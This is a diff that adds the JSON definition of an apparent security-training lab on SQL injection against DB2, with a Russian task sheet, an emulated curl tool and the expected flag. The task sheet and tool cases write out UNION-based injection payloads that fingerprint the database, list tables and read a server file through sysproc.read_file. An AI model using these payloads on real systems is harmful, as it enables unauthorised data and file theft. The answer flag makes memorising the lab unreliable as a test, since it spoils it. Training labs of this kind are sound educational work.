@@ -1,0 +1,42 @@
+{
+  "id": "web-db2",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{db2_sys1bm_f1l3_r34d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: DB2 SQLi\n\nЭндпоинт /report?id= уязвим, СУБД — DB2.\n\n1. Подтверди диалект:\n   curl -s \"https://app.target/report?id=1 UNION SELECT current server,2 FROM sysibm.sysdummy1-- -\"\n2. Сними таблицы:\n   curl -s \"https://app.target/report?id=1 UNION SELECT name,2 FROM sysibm.systables-- -\"\n3. Прочитай флаг через функцию чтения файла:\n   curl -s \"https://app.target/report?id=1 UNION SELECT sysproc.read_file('/flag'),2 FROM sysibm.sysdummy1-- -\"\n4. Запиши флаг в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/report)",
+      "cases": [
+        {
+          "match": "current server|sysdummy1",
+          "example": "-s '.../report?id=1 UNION SELECT current server,2 FROM sysibm.sysdummy1-- -'",
+          "output": "DB2/LINUXX8664 11.5.0\n"
+        },
+        {
+          "match": "systables",
+          "example": "-s '.../report?id=1 UNION SELECT name,2 FROM sysibm.systables-- -'",
+          "output": "USERS\nORDERS\nAUDIT\n"
+        },
+        {
+          "match": "read_file|/flag",
+          "example": "-s '.../report?id=1 UNION SELECT sysproc.read_file('/flag'),2 FROM sysibm.sysdummy1-- -'",
+          "output": "nto{db2_sys1bm_f1l3_r34d}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /report на app.target.\n"
+    }
+  }
+}
